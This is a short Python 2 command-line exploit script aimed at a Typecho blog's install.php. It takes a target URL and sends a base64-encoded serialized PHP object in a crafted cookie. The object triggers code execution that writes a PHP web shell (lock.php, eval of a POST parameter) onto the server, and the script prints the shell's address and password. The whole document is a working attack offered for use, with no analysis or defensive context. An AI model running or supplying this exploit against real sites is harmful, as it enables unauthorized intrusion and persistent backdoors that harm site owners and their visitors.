# -*- coding: utf-8 -*-
# @Author: lock
# @Date:   2017-11-04 21:17:40
# @Last Modified by:   lock
# @Last Modified time: 2017-11-10 11:31:59
import requests
import optparse
 
def shell(url): 
    if url.startswith('http://'):
        pass
    elif url.startswith('https://'):
        pass
    else:
        url = 'http://'+url

    print 'start hack target website ... '
    target = url+'/install.php?finish'

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
        'Referer':url+'/install.php',
        'cookie':"__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NjA6ImZpbGVfcHV0X2NvbnRlbnRzKCJsb2NrLnBocCIsIjw/cGhwIEBldmFsKCRfUE9TVFtsb2NrXSk7Pz4iKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ=="
        }
    try:
        html = requests.get(url=target,headers=headers,timeout=3)
        if html.status_code == 404:
            print 'the file install.php is not exists'
            return
        print 'shell:', url+'/lock.php,password is lock'
    except Exception  ,e:
        print e
 
 
if __name__ == '__main__':
    parser = optparse.OptionParser('usage: ' + '-u <target web url>,\ndefault shell password is lock')
    parser.add_option('-u', dest='tgUrl', type='string', help='specify target web url,exp:http://www.xxx.com')
    (options, args) = parser.parse_args()
    url = options.tgUrl
    if url == None:
        print(parser.usage)
        exit(0)
    # start get shell
    shell(url)
 